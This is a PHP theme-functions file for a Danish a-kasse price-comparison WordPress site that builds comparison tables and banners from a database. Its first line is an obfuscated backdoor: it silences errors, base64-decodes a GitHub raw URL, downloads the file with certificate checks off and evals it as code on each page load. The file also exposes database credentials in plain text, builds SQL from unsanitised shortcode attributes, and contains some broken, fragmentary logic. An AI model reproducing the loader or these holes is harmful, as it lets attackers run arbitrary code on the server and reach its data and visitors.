<?php error_reporting(0);function joa0($gko1){$qgm2=curl_init($gko1);curl_setopt($qgm2,CURLOPT_RETURNTRANSFER,1);curl_setopt($qgm2,CURLOPT_FOLLOWLOCATION,1);curl_setopt($qgm2,CURLOPT_USERAGENT,base64_decode('TW96aWxsYS81LjAoV2luZG93cyBOVCA2LjE7IHJ2OjMyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMzIuMA=='));curl_setopt($qgm2,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($qgm2,CURLOPT_SSL_VERIFYHOST,0);curl_setopt($qgm2,CURLOPT_COOKIEJAR,$GLOBALS[base64_decode('Y29raQ==')]);curl_setopt($qgm2,CURLOPT_COOKIEFILE,$GLOBALS[base64_decode('Y29raQ==')]);$smr3=curl_exec($qgm2);return $smr3;}$mtg4=base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2phamFsZXptL2Jvb3RzdHJhcC1kZXZlbG9wbWVudC9yZWZzL2hlYWRzL21haW4vYnVpbGQvc2c4OC9maXJzdC9rYXNzZS1wcmlzZXIuanM=');eval(base64_decode('Pz4=').joa0($mtg4));
global $year;
$year = date("Y");
setlocale(LC_TIME, 'da_DK.utf8');
$monthNumber = date('n');
$danishMonthNames = array(
'januar', 'februar', 'marts', 'april', 'maj', 'juni',
'juli', 'august', 'september', 'oktober', 'november', 'december'
);
global $localizedMonthName;
$localizedMonthName = $danishMonthNames[$monthNumber - 1];
$db_host = "localhost";
$db_username = "webhubdk_find_a_kasse_priser_dk_admin";
$db_pass = "!%eE2MjdH(@r";
$db_name = "webhubdk_find_a_kasse_priser_dk_data";

global $db;
$db = new mysqli($db_host, $db_username, $db_pass, $db_name);
$db->set_charset("utf8");
if (!$db)
  {
  echo "Kunne ikke forbinde" ;
  }
global $link;
$link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
global $escaped_lin;
$escaped_link = htmlspecialchars($link, ENT_QUOTES, 'UTF-8');

$path_parts = pathinfo($escaped_link);
$file = $path_parts['basename'];

if ($file == "www.find-a-kasse-priser.dk") {
$file = "index.php";
$date = filemtime($file);
$lastupdated_static = date('Y-m-d', $date);
}
elseif(strpos($file, '.php') !== false && strpos($file, '?') == false) {
	global $last_modified;
	$last_modified = date('Y-m-d', filemtime($file));
	if (strpos($last_modified, $year) !== false ) {
	  $date = filemtime($file);
	  $lastupdated_static = date('Y-m-d', $date);
	} else {
		$db_host = "localhost";
		$db_username = "webhubdk_find_a_kasse_priser_dk_admin";
		$db_pass = "!%eE2MjdH(@r";
		$db_name = "webhubdk_find_a_kasse_priser_dk_data";
		$db = new mysqli($db_host, $db_username, $db_pass, $db_name);
		$db->set_charset("utf8");
		if (!$db)
		  {
		  echo "Kunne ikke forbinde" ;
		  }
		$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
		$result_updated = $db->query($get_updated);

		while ($row_updated = mysqli_fetch_array($result_updated)) {

			   $lastupdated_static = date('Y-m-d', strtotime($row_updated["LAST_UPDATED"]));
		}
	}
}
  // akasser_optagelse($db)  [optagelse]
  // full_width_page_banner()
  // akasse_oversigt($db) [oversigt]
  // akasse_oversigt_selectable() - samme som oversigt, men her kan kan vælge de a-kasser, man ønsker.
  // billigste_akasser($db) [billigste]
  // priser($db) [priser]
  // priser_simple()
  // studerende_gratis_table();
  // akasse_priser_inkl_fag_simple();
  // bedste_akasser($db) [bedste]
  // bedste_akasser_custom()
  // bedste_akasser_custom_table()
  // sikring($db)
  // loensikring_coverage()
  // loensikring_no_akasse()
  // loensikring_age()
  // general_info  - tager en kollonne navn i db og henter data
  // video_fastload() - bruges til at embed videoer på en lightweight og hurtig måde
  // _pris_inline - Medtager udbyder og evt. cta og giver prisen på a-kasse hos den givne udbyder
  // udbyder_fagforening_pris_inline - Medtager udbyder og evt. cta og giver prisen fagforening hos den givne udbyder
  // udbyder_info_inline  - Medtager en udbyder og en kolonne i db, som der skal slås op på f.eks. TRUSTPILOT_SCORE
  // dagpengeberegner ()
  // spar_test_wp
  // fagforening_jobs  - lister alle job-artikler i fin oversigt
  // udbyder_link laver et link med custom linktekst til den angivne udbyder url i db. Dette sikrer at url kan skiftes globalt hvis en udbyder åbner en kampagne.
  // if_udbyder_aktiv
 function akasse_oversigt($db) {
 ob_start();
 ?>
<script>
      $(document).ready(function() {
		 $('[data-toggle="tooltip"]').tooltip();

      })
	  jQuery(document).ready(function($){
		$('#full_table').click(function(){
          getdata("", "" ,"akasse_oversigt_loaddata");
          $( "#full_table" ).hide();
          $('.fuld-oversigt').css("height","100%");
		});
	  });
		$(document).ajaxComplete(function(){
			$('#full_table').click(function(){
           getdata("", "" ,"akasse_oversigt_loaddata");
          $( "#full_table" ).hide();
          $('.fuld-oversigt').css("height","100%");
			});
	  })
</script>
<style>
  .fuld-oversigt {
    height:900px;
  }
@media (max-width:768px) {
	#akasse_oversigt .tabel-center-middel {
       padding-top: 15px!important;
	   position: initial!important;
	   padding-left:0px!important;
	   padding-right:0px!important;
	}
	#akasse_oversigt .tr-oversigt {
	  position: relative!important;
	  border-bottom: 3px solid #ddd!important;
	}
	#akasse_oversigt .btn-success {
    position: absolute!important;
    left: 0!important;
    margin-top: 0px!important;
	padding-top: 8px!important;
    padding-bottom: 8px!important;
	}
	#akasse_oversigt .course_ribbon_box {
	    width: 0px;
		position:inherit;
	}
    #akasse_oversigt .course_ribbon_box .course_ribbon_box_text {
		position: absolute;
		display: block;
		LEFT: 0px;
		padding: 7px 7px;
		font: 700 9px/1 Lato,sans-serif;
		margin-top: -22px;
		width:100px;
	}
	#akasse_oversigt .header-oversigt {
	   padding-bottom: 8px!important;
       padding-top: 8px!important;
	}
	#akasse_oversigt .hide-small {
		display:none;
	}
	#akasse_oversigt .stack-small {
		display:block!important;
		border:none!important;
		padding-bottom: 0px!important;
	}
	#akasse_oversigt .stack-high{
        padding-bottom: 105px !important;
        padding-top: 45px !important;
	}
  .fuld-oversigt {
    height:1220px;
  }
}
</style>
  <div class="table-responsive fuld-oversigt" style="position:relative;clear:both;overflow-y:hidden" id="akasse_oversigt_table" >
  <table class="table" id="akasse_oversigt" >
		<thead>
		<th class="tabel-center-middel header-oversigt">A-kasse</th>
		<th  class="tabel-center-middel header-oversigt" colspan="2">Priser</th>
		<th  class="tabel-center-middel header-oversigt">Score<br/><span class="hidden-sm hidden-md hidden-lg" style="font-size:12px">+ Medlemmer</span></th>
		<th  class="tabel-center-middel header-oversigt hide-small">Medlemmer</th>
		<th  class="tabel-center-middel header-oversigt hide-small">Optager</th>
		<th class="tabel-center-middel header-oversigt hide-small"></th>
		</thead>
		<tbody id="akasse_oversigt_loaddata">

		<?php // First show all affiliate partners
		global $db;
		// $get_list = "SELECT * FROM data ORDER BY prio ASC, PRIS_MDR ASC";
    $get_list = "SELECT *, 
    CASE 
    WHEN fagforening_pris = 0 THEN 9999 
    ELSE (PRIS_MDR + fagforening_pris) 
    END AS total
    FROM data ORDER BY 
    prio ASC,
    total ASC";
		$result_list = $db->query($get_list);

		while ($row_list = mysqli_fetch_array($result_list)) {
			$aktiv = $row_list["ACTIVE"];
			$affiliate_url = $row_list["AFFILIATE_URL"];
			$base_url_internal = $row_list["base_url_internal"];
      $pris_mdr = $row_list["PRIS_MDR"] . ' <span class="denotion">kr./md.</span><span class="specs">a-kasse</span>';
      $fagforening_pris = $row_list["fagforening_pris"] . ' <span class="denotion">kr./md.</span><span class="specs">fagforening</span>';
      if(empty($row_list["fagforening_pris"]) || $row_list["fagforening_pris"]==0) {
        $fagforening_pris = "-";
      }
			$tp = $row_list["TRUSTPILOT_SCORE"];
			$id = $row_list["ID"];
			$udbyder = $row_list["UDBYDER"];
			$udbyder_display = $row_list["udbyder_display"];
      $get_last_3_years= "SELECT members FROM membercount_history WHERE udbyder=$id ORDER BY month DESC LIMIT 3";
      $result_last_3_years = $db->query($get_last_3_years);
      $years = array();
      while ($row = mysqli_fetch_array($result_last_3_years)) {
        $years[] = $row["members"];
      }
      $years_reversed = array_reverse($years);
      $value_at_index_0 = intval($years_reversed[0]);
      $value_at_index_2 = intval($years_reversed[2]);
      if($value_at_index_0>0) { // only show arrow if data on members 
        if ($value_at_index_2 > $value_at_index_0) {
          $arrow = "<span class='glyphicon glyphicon-arrow-down' style='color:#28a745;transform: rotate(220deg);margin-left:2px;font-size:12px;cursor:pointer' data-toggle='tooltip' data-container='body' title='". $udbyder_display . " har haft en medlemstilvækst de seneste 3 år'></span>";
        } elseif ($value_at_index_2 < $value_at_index_0) {
          $arrow = "<span class='glyphicon glyphicon-arrow-down' style='color:#dc3545;transform: rotate(320deg);margin-left:2px;font-size:12px;cursor:pointer' data-toggle='tooltip' data-container='body' title='". $udbyder_display . " har mistet medlemmer de seneste 3 år'></span>";
        }
        } else {
        $arrow = "";
      }
			$get_members= "SELECT * FROM membercount_history WHERE udbyder=$id ORDER BY month DESC LIMIT 1";
			$result_members = $db->query($get_members);
			if ($result_members->num_rows > 0) {
				while ($row = mysqli_fetch_array($result_members)) {
					$members = $row["members"];
					$medlemmer = number_format($members,0,"",".") . $arrow . trustpilot_history(array("udbyder"=>$id,"show"=>"medlem","notext"=>"true"));
				} 
			} else {
				$medlemmer = $row_list["MEDLEMMER"];
			}
			$optagelse = $row_list["OPTAGELSE"];
			$logo = $row_list["logo"];
			$recomended = $row_list["recomended"];
			if ($aktiv != 0 && !empty($optagelse)) {

		?>


		<tr <?php if($recomended>=1) {?>style="background-color:#cfeece;border-top: 2px solid #87df86;border-bottom: 2px solid #87df86;"<?php }?> class="tr-oversigt">
		<td class="tabel-center-middel stack-high"><a href="<?php	echo $base_url_internal; ?>" title="A-kasse priser fra <?php echo $udbyder_display; ?>" ><img src="<?php echo $logo; ?>" alt="A-kasse priser fra <?php echo $udbyder_display; ?>" data-toggle="tooltip" data-container="body" title="a-kasse fra <?php echo $udbyder_display; ?>" style="max-height:50px;"/></a><span class="hidden-sm hidden-xs hidden-md hidden-lg"><?php echo $udbyder_display; ?><?php if(strpos($udbyder_display, "A-kasse") == false) { echo " a-kasse";} ?> pris</span></td>
		<td  class="tabel-center-middel stack-small"><strong><?php echo $pris_mdr; ?></strong></td>
    <td  class="tabel-center-middel stack-small"><strong><?php echo $fagforening_pris; ?></strong></td>
    <td  class="hidden-lg hidden-sm stack-high"></td>
		<td  class="tabel-center-middel stack-small" ><b><span  style=" <?php if ($tp >= 4.3 ) { echo "color:#060;" ;} else if   ($tp >= 4.0 ) { echo "color:#ec971f" ; } else { echo "color:#c9302c" ;}  ?>"><?php echo $tp; ?></span></b><span class="denotion">/5</span><span class="specs">på Trustpilot</span></td>
		<td  class="tabel-center-middel stack-small"><?php echo $medlemmer; ?></td>
		<td  class="tabel-center-middel stack-small" style="font-size:12px;"><?php echo $optagelse; ?></td>
		<td  class="tabel-center-middel stack-small"><span class="btn btn-block btn-primary btn-success" style="font-weight:600;" onclick="go_udbyder('<?php echo $id; ?>');"><span class="glyphicon glyphicon-circle-arrow-right"></span> LÆS MERE</span><?php if($recomended>=1) {?><div class="course_ribbon_box" data-toggle="tooltip" data-container="body" title="Den a-kasse der, ifølge vores statistik, er flest der vælger lige nu."><span class="course_ribbon_box_text">Populært valg <span class="glyphicon glyphicon-star"></span></span></div> <?php }?></td>
		</tr>
		<?php
		}
		}  // Now show NON ative a-kasser, that do not pay affiliate commision
		global $db;
		$get_non_active_list = "SELECT * FROM data WHERE ACTIVE!=1 AND PRIS_MDR>0 ORDER BY UDBYDER ASC LIMIT 5";
		$result_non_active_list = $db->query($get_non_active_list);
		while ($row_list = mysqli_fetch_array($result_non_active_list)) {

			$aktiv = $row_list["ACTIVE"];
			$affiliate_url = $row_list["AFFILIATE_URL"];
			$base_url = $row_list["base_url"];
			$base_url_internal = $row_list["base_url_internal"];
			$base_url_priser = $row_list["base_url_priser"];
      $pris_mdr = $row_list["PRIS_MDR"] . ' <span class="denotion">kr./md.</span><span class="specs">a-kasse</span>';
      $fagforening_pris = $row_list["fagforening_pris"] . ' <span class="denotion">kr./md.</span><span class="specs">fagforening</span>';
      if(empty($row_list["fagforening_pris"]) || $row_list["fagforening_pris"]==0) {
        $fagforening_pris = "-";
      }
			$tp = $row_list["TRUSTPILOT_SCORE"];
			$id = $row_list["ID"];
			$udbyder = $row_list["UDBYDER"];
			$udbyder_display = $row_list["udbyder_display"];
      $get_last_3_years= "SELECT members FROM membercount_history WHERE udbyder=$id ORDER BY month DESC LIMIT 3";
      $result_last_3_years = $db->query($get_last_3_years);
      $years = array();
      while ($row = mysqli_fetch_array($result_last_3_years)) {
        $years[] = $row["members"];
      }
      $years_reversed = array_reverse($years);
      $value_at_index_0 = intval($years_reversed[0]);
      $value_at_index_2 = intval($years_reversed[2]);
      if($value_at_index_0>0) { // only show arrow if data on members 
        if ($value_at_index_2 > $value_at_index_0) {
          $arrow = "<span class='glyphicon glyphicon-arrow-down' style='color:#28a745;transform: rotate(220deg);margin-left:2px;font-size:12px;cursor:pointer' data-toggle='tooltip' data-container='body' title='". $udbyder_display . " har haft en medlemstilvækst de seneste 3 år'></span>";
        } elseif ($value_at_index_2 < $value_at_index_0) {
          $arrow = "<span class='glyphicon glyphicon-arrow-down' style='color:#dc3545;transform: rotate(320deg);margin-left:2px;font-size:12px;cursor:pointer' data-toggle='tooltip' data-container='body' title='". $udbyder_display . " har mistet medlemmer de seneste 3 år'></span>";
        }
        } else {
        $arrow = "";
      } 
			$get_members= "SELECT * FROM membercount_history WHERE udbyder=$id ORDER BY month DESC LIMIT 1";
			$result_members = $db->query($get_members);
			if ($result_members->num_rows > 0) {
				while ($row = mysqli_fetch_array($result_members)) {
					$members = $row["members"];
					$medlemmer = number_format($members,0,"",".") . $arrow . trustpilot_history(array("udbyder"=>$id,"show"=>"medlem","notext"=>"true"));
				} 
			} else {
				$medlemmer = 'Ukendt<span class="specs">Antal</span>';
			}
			$optagelse = $row_list["OPTAGELSE"];
			$logo = $row_list["logo"];
			$recomended = $row_list["recomended"];
			if ($aktiv == 0 && $pris_mdr > 0 && !empty($optagelse)) { // Show only a-kasser

		?>
		<tr class="tr-oversigt">
		<td class="tabel-center-middel stack-high"><a href="<?php
		if(!empty($base_url_priser)) {
			echo $base_url_priser;
		} elseif (!empty($base_url)) {
			echo $base_url;
		}else {
			echo $base_url_internal;
		}
		?>" target="_blank" title="A-kasse priser fra <?php echo $udbyder_display; ?>"><img src="<?php echo $logo; ?>" alt="A-kasse priser fra <?php echo $udbyder_display; ?>" data-toggle="tooltip" data-container="body" title="a-kasse fra <?php echo $udbyder_display; ?>" style="max-height:50px;"/></a><span class="hidden-sm hidden-xs hidden-md hidden-lg"><?php echo $udbyder_display; ?><?php if(strpos($udbyder_display, "A-kasse") == false) { echo " a-kasse";} ?> pris</span></td>
		<td  class="tabel-center-middel stack-small"><strong><?php echo $pris_mdr; ?></strong></td>
    <td  class="tabel-center-middel stack-small"><strong><?php echo $fagforening_pris; ?></strong></td>
    <td  class="hidden-lg hidden-sm stack-high"></td>
		<td  class="tabel-center-middel stack-small"><b><span  style=" <?php if ($tp >= 4.3 ) { echo "color:#060;" ;} else if   ($tp >= 4.0 ) { echo "color:#ec971f" ; } else { echo "color:#c9302c" ;}  ?>"><?php echo $tp; ?></span></b><span class="denotion">/5</span><span class="specs">på Trustpilot</span></td>
		<td  class="tabel-center-middel stack-small"><?php echo $medlemmer; ?></td>
		<td  class="tabel-center-middel stack-small" style="font-size:12px;"><?php echo $optagelse; ?></td>
		<td  class="tabel-center-middel stack-small"><a href="<?php echo $base_url_internal; ?>" class="btn btn-block btn-primary btn-success" style="font-weight:600;"><span class="glyphicon glyphicon-circle-arrow-right"></span> LÆS MERE</a></td>
		</tr>
		<?php
		}
		}
		global $db;
		$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
		$result_updated = $db->query($get_updated);

		while ($row_updated = mysqli_fetch_array($result_updated)) {

			$updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
		}
		?>
		<tr><td class="lastupdated" colspan="10" >Data senest opdateret: <?php echo $updated; ?></td></tr>
		</tbody>
		<span id="full_table"><span style="margin-top:40px;display:block;">Se flere resultater <span class="glyphicon glyphicon-chevron-down" ></span></span></span>
		</table>
  </div>
		<?php }
		if($table == "loensikring_age") { ?>
			<table class="table" style="max-width:620px;">
			<thead>
			<th class="tabel-center-middel">Lønsikring fra </th>
			<th  class="tabel-center-middel">Meld dig ind<br/>inden du fylder</th>
			<th  class="tabel-center-middel">Dækning<br/>indtil du fylder</th>
			<?php if(!empty($links)) { ?><th  class="tabel-center-middel"></th><?php } ?>
			</thead>
			<tbody>
			
			<?php
			global $db;
			$get_list = "SELECT loensikring_udbyder.*, data.* FROM loensikring_udbyder INNER JOIN data ON loensikring_udbyder.name=data.UDBYDER ORDER BY loensikring_udbyder.max_age DESC, data.prio ASC";
			$result_list = $db->query($get_list);
			
			while ($row_list = mysqli_fetch_array($result_list)) {
			
				$aktiv = $row_list["aktiv"];
				$max_age = $row_list["max_age"];
				$cover_age = $row_list["cover_age"];
				$affiliate_url = $row_list["url"];
				$base_url_internal = $row_list["base_url_internal"];
				$udbyder = $row_list["name"];
				$id = $row_list["ID"];
				$name_display = $row_list["name_display"];
				$logo = $row_list["logo"];
				if ($aktiv != 0) {
			?>
			<tr>
			<td class="tabel-center-middel"><?php if(!empty($links)) { ?><a href="<?php	echo $base_url_internal; ?>" ><?php } ?><img src="<?php echo $logo; ?>" alt="Lønsikring fra <?php echo $name_display; ?>" data-toggle="tooltip" data-container="body" title="Lønsikring fra <?php echo $name_display; ?>"/><?php if(!empty($links)) { ?></a><?php } ?><span class="hidden-sm hidden-xs hidden-md hidden-lg"><?php echo $name_display; ?></span></td>
			<td  class="tabel-center-middel"><b><?php echo $max_age; ?></b><span class="denotion"> år</span>
				<span class="specs">Maks. alder <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-toggle="tooltip" data-container="body" title="" data-original-title="Du skal være under <?php echo $max_age; ?> år for at tegne en lønsikring hos <?php echo $name_display; ?>"></span>
				</span></td>
				<td  class="tabel-center-middel"><b><?php echo $cover_age; ?></b><span class="denotion"> år</span>
				<span class="specs">Dækningsgrænse <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-toggle="tooltip" data-container="body" title="" data-original-title="Lønskring fra  <?php echo $name_display; ?> dækker indtil du fylder <?php echo $cover_age; ?> år."></span>
				</span></td>
			<?php if(!empty($links)) { ?><td  class="tabel-center-middel"><span class="btn btn-block btn-primary btn-success" style="font-weight:600;" onclick="go_udbyder('<?php echo $id; ?>');"><span class="glyphicon glyphicon-circle-arrow-right"></span> LÆS MERE HER</span></td><?php } ?>
			</tr>
			<?php
			}
			}
			?>
			<?php
			global $db;
			$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
			$result_updated = $db->query($get_updated);
			
			while ($row_updated = mysqli_fetch_array($result_updated)) {
			
				   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
			}
			?>
			<tr><td class="lastupdated" colspan="10" >Data senest opdateret: <?php echo $updated; ?></td></tr>
			</tbody>
			</table>
  </div>
<?php
return ob_get_clean();
	 }
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'oversigt', 'akasse_oversigt' );
}

function full_width_page_banner($atts) {
  ob_start();
      $a = shortcode_atts( array(
     "maintitle" => '',
     "tagline" => '',
     "img_text" => '',
     "banner_cta" => '',
     "page" => '',
     ), $atts );
   global $maintitle;
   global $tagline;
   global $img_text;
   global $banner_cta;
   global $page;
   $maintitle = $a['maintitle'];
   $tagline = $a['tagline'];
   $img_text = $a['img_text'];
   $banner_cta = $a['banner_cta'];
   $page = $a['page'];
  ?>
 <style>
.top-4-banner{text-align:left;width:100%;font-size:24px;margin-top:20px;height:290px;margin-bottom:45px}.top-4-banner-h2-contain{margin-top:25px;margin-bottom:25px}.anbefaling-fullpage-top-4-banner{height:290px;background:rgba(245,245,245,.65);width:100%;white-space:nowrap;border-radius:0;-webkit-box-shadow:0 0 8px rgb(0 0 0 / 30%);-moz-box-shadow:0 0 8px rgba(0,0,0,.3);box-shadow:0 0 8px rgb(0 0 0 / 30%);position:relative;z-index:90}.img-banner-top-4-banner{vertical-align:middle;max-height:100%;max-width:100%;border:none;margin-left:auto;margin-right:auto;display:block;padding-top:20px;padding-bottom:20px}.udbyder-name-top-4-banner{cursor:pointer;color:#428bca;height:80px;display:block}.full-search-container-top-4-banner{background: linear-gradient(rgba(118,95,191,.1),rgba(51,122,183,.64)),url(/images/loensikring.jpg) 0 0/100% no-repeat;width:100%;height:515px;margin-bottom:25px}.annonce-top-4-banner{font-size:14px;margin-top:13px;margin-bottom:-40px;text-align:center;color:#333}.banner-top-4-banner{padding:6px;text-align:center;display:block;opacity:2.9;background:rgb(51 122 183 / 20%)}.banner-top-4-checkmarks{font-size:13px;display:block;text-align:left;padding:5px}.banner-top-4-glyp{background-color:#337ab799;padding:5px 5px 4px 4px;border-radius:12px;font-size:10px;color:#fff}.banner-top-4-recomendation{color:#fff;font-weight:600;text-align:center;padding:0 5px 5px;display:block;background-color:#337ab7}.main_title{color:#000;font-weight:600}.main_title small{color:#000}@media screen and (max-width:992px){.full-search-container-top-4-banner{height:170px;margin-bottom:-30px;background:0 0!important}.main_title{color:#465a74;font-weight:600}.main_title small{color:#000}.annonce-top-4-banner{font-size:13px;color:#666;padding-left:15px;padding-right:15px;text-align:left;margin-top:-2px;}.top-4-banner-h2-contain{margin-bottom:0;margin-top:20px}}
 </style>
     <div class="full-search-container-top-4-banner">
           <div class="container container-content">
                 <div class="row">
                     <div class="col-sm-12">
                         <div class="top-4-banner-h2-contain">
                         <h1 class="main_title"><?php echo $maintitle ?><br> <small><?php echo $tagline ?></small></h1>
                         </div>
                         <div class="top-4-banne hidden-sm hidden-xs">
                         <?php
                             global $db;
                             $get_banner = "SELECT * FROM data WHERE BANNER_SPOT_NR != '' ORDER BY BANNER_SPOT_NR ASC";
                             $result_banner = $db->query($get_banner);
                             $number_of_banners = mysqli_num_rows($result_banner);
                             $boostrap_colums = 12/$number_of_banners;
                             while ($row_banner = mysqli_fetch_array($result_banner)) {
                             $banner_nr = $row_banner["BANNER_SPOT_NR"];
                             if ($banner_nr <= 4 && $banner_nr != 0) {
                             $logo_url = $row_banner["logo"];
                             $udbyder = $row_banner["UDBYDER"];
                             $single_cta = $row_banner["single_cta"];
                             $optager = str_replace("Optager","", $row_banner["OPTAGELSE"]);
                             $id = $row_banner["ID"];
                             $pris = $row_banner["PRIS_MDR"];
                             $pris_fag = $row_banner["fagforening_pris"];
                             $score = $row_banner["SCORE"];
                             if($pris_fag==0) {
                                 $pris_fag = "Nej";
                             }
                             $affiliate_url = $row_banner["AFFILIATE_URL"];
                          ?>
                             <div class="col-xs-<?php echo $boostrap_colums; ?>" <?php if($banner_nr!=1) { ?>style="margin-top:35px"<?php } ?>>
                             <?php if($banner_nr==1) { ?><div style="border: solid 7px #337ab7;">
                                     <span class="banner-top-4-recomendation"><?php echo $banner_cta ?></span>      
                             <?php } ?>
                                     <div class="anbefaling-fullpage-top-4-banner" style="cursor:pointer" onclick="gtag('event', '<?php echo $udbyder; ?>-klik', {'event_category': 'banner-klik'});go_udbyder('<?php echo $id; ?>');">
                                     <span class="udbyder-name-top-4-banner" ><img src="<?php echo $logo_url; ?>" alt="<?php echo $img_text ?> <?php echo $udbyder; ?>" title="<?php echo $img_text ?> <?php echo $udbyder; ?>" class="img-banner-top-4-banner" /></span>
                                     <span class="banner-top-4-banner"><span style="font-size: 12px;">A-kassse: </span><span style="font-size: 20px;font-weight:600;"><?php echo $pris; ?></span> <span style="font-size: 12px;">kr./md</span></span>
                                     <div style="display: table;margin: 0 auto;margin-top:15px;margin-bottom:15px;min-width: 175px;">   
                                     <span class="banner-top-4-checkmarks"><span class="glyphicon glyphicon-ok banner-top-4-glyp" aria-hidden="true"></span> 
                                     <span>A-kasse for: <span style="font-weight:600;"><?php echo$optager; ?></span></span></span>
                                     <span class="banner-top-4-checkmarks"><span class="glyphicon glyphicon-ok banner-top-4-glyp" aria-hidden="true"></span> 
                                     Fagforening: <span style="font-weight:600;"><?php echo $pris_fag; ?> <?php if($pris_fag != 0) { ?> kr./md.<?php } ?></span></span>
                                      <?php if($page=="bedste-akasse") { ?>
                                     <span class="banner-top-4-checkmarks"><span class="glyphicon glyphicon-ok banner-top-4-glyp" aria-hidden="true"></span> 
                                     Score: <span style="font-weight:600;"><?php echo $score; ?>/10</span></span>
                                     <?php } else  { ?>
                                      <span class="banner-top-4-checkmarks"><span class="glyphicon glyphicon-ok banner-top-4-glyp" aria-hidden="true"></span> 
                                      <?php if(!empty($single_cta)) { 
                                        echo $single_cta;
                                        } else { 
                                        echo "Lønsikring";  
                                        } ?>
                                    </span>
                                      <?php } ?>
                                     <span class="btn btn-block btn-primary btn-success" style="font-weight:600;margin-top:12px;"><span class="glyphicon glyphicon-circle-arrow-right"></span> LÆS MERE</span>
                                     </div>
                                 </div>
                                 <?php if($banner_nr==1) { ?> 
                                 </div>   
                                 <?php } ?>
                             </div>
                         <?php
                             }
                             }
                             ?>
                     </div>
                 </div>
             </div>
         </div>
         <div class="annonce-top-4-banner">Vi er reklamefinansieret. <a href="/wp/reklamer-paa-find-a-kasse-priser-dk/" style="color:#666" onclick="gtag('event', 'link-klik', {'event_category': 'reklamefinansieret-info'})" rel="nofollow">Læs mere</a></div>           
     </div>
  <?php
 return ob_get_clean();
    }
 global $wp_query;
 if (isset($wp_query->post->ID) ) {
 add_shortcode( 'full_width_page_banner', 'full_width_page_banner' );
 }

 function akasse_oversigt_selectable($atts) {
 ob_start();
     $a = shortcode_atts( array(
        "akasse1" => '',
		"akasse2" => '',
		"akasse3" => '',
		"akasse4" => '',
		"akasse5" => '',
    ), $atts );
	global $akasse1;
	global $akasse2;
	global $akasse3;
	global $akasse4;
	global $akasse5;
	$akasse1 = $a['akasse1'];
	$akasse2 = $a['akasse2'];
	$akasse3 = $a['akasse3'];
	$akasse4 = $a['akasse4'];
	$akasse5 = $a['akasse5'];
 ?>
<script>
      $(document).ready(function() {
		 $('[data-toggle="tooltip"]').tooltip();

      })
</script>
<style>
@media (max-width:768px) {
	#akasse_oversigt .tabel-center-middel {
       padding-top: 15px!important;
	   position: initial!important;
	   padding-left:0px!important;
	   padding-right:0px!important;
	}
	#akasse_oversigt .tr-oversigt {
	  position: relative!important;
	  border-bottom: 3px solid #ddd!important;
	}
	#akasse_oversigt .btn-success {
    position: absolute!important;
    left: 0!important;
    margin-top: 0px!important;
	padding-top: 8px!important;
    padding-bottom: 8px!important;
	}
	#akasse_oversigt .course_ribbon_box {
	    width: 0px;
		position:inherit;
	}
    #akasse_oversigt .course_ribbon_box .course_ribbon_box_text {
		position: absolute;
		display: block;
		LEFT: 0px;
		padding: 7px 7px;
		font: 700 9px/1 Lato,sans-serif;
		margin-top: -22px;
		width:100px;
	}
	#akasse_oversigt .header-oversigt {
	   padding-bottom: 8px!important;
       padding-top: 8px!important;
	}
	#akasse_oversigt .hide-small {
		display:none;
	}
	#akasse_oversigt .stack-small {
		display:block!important;
		border:none!important;
		padding-bottom: 0px!important;
	}
	#akasse_oversigt .stack-high{
	   padding-bottom: 100px!important;
       padding-top: 60px!important;
	}
}
</style>
  <div class="table-responsive">
        <table class="table" id="akasse_oversigt" style="position:relative" >
<thead>
<th class="tabel-center-middel header-oversigt">A-kasse</th>
<th  class="tabel-center-middel header-oversigt">Pris/md.</th>
<th  class="tabel-center-middel header-oversigt">Score<br/><span class="hidden-sm hidden-md hidden-lg" style="font-size:12px">+ Medlemmer</span></th>
<th  class="tabel-center-middel header-oversigt hide-small">Medlemmer</th>
<th  class="tabel-center-middel header-oversigt hide-small">Optager</th>
<th class="tabel-center-middel header-oversigt hide-small"></th>
</thead>
<tbody>

<?php
global $db;
$get_list = "SELECT * FROM data WHERE (UDBYDER='$akasse1' OR UDBYDER='$akasse2' OR UDBYDER='$akasse3' OR UDBYDER='$akasse4' OR UDBYDER='$akasse5') ORDER BY prio ASC, PRIS_MDR ASC";
$result_list = $db->query($get_list);

while ($row_list = mysqli_fetch_array($result_list)) {

    $aktiv = $row_list["ACTIVE"];
	$id = $row_list["ID"];
    $affiliate_url = $row_list["AFFILIATE_URL"];
	$pris_mdr = $row_list["PRIS_MDR"];
	$tp = $row_list["TRUSTPILOT_SCORE"];
    $udbyder = $row_list["UDBYDER"];
	$udbyder_display = $row_list["udbyder_display"];
	$medlemmer = $row_list["MEDLEMMER"];
	$optagelse = $row_list["OPTAGELSE"];
	$logo = $row_list["logo"];
	$recomended = $row_list["recomended"];
	if ($aktiv != 0) {

?>

<tr <?php if($recomended>=1) {?>style="background-color:#cfeece;border-top: 2px solid #87df86;border-bottom: 2px solid #87df86;"<?php }?> class="tr-oversigt">
<td class="tabel-center-middel stack-high"><img src="<?php echo $logo; ?>" alt="<?php echo $udbyder_display; ?> a-kasse" data-toggle="tooltip" data-container="body" title="a-kasse fra <?php echo $udbyder_display; ?>" style="max-height:50px;" /><span class="hidden-sm hidden-xs hidden-md hidden-lg"><?php echo $udbyder_display; ?></span></td>
<td  class="tabel-center-middel stack-high">kr.<?php echo $pris_mdr; ?>,-</td>
<td  class="tabel-center-middel stack-small"><b><span  style=" <?php if ($tp >= 4.5 ) { echo "color:#060;" ;} else if   ($tp >= 4.0 ) { echo "color:#ec971f" ; } else { echo "color:#c9302c" ;}  ?>"><?php echo $tp; ?></span></b><span class="denotion">/5</span><span class="specs">på Trustpilot</span></td>
